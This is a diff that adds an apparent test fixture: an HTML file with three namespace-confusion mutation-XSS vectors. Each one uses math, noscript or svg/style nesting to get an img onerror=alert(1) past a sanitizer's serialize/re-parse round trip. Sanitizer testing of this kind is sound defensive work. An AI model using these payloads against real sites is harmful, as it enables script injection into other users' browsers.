@@ -1,0 +1,9 @@
+<!doctype html>
+<html>
+<body>
+  <p>Namespace-confusion mXSS vectors: after a naive serialize/re-parse round trip these can mutate into executable markup.</p>
+  <form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+  <noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
+  <svg><p><style><!--</style><img src="x" onerror="alert(1)">--></style></p></svg>
+</body>
+</html>
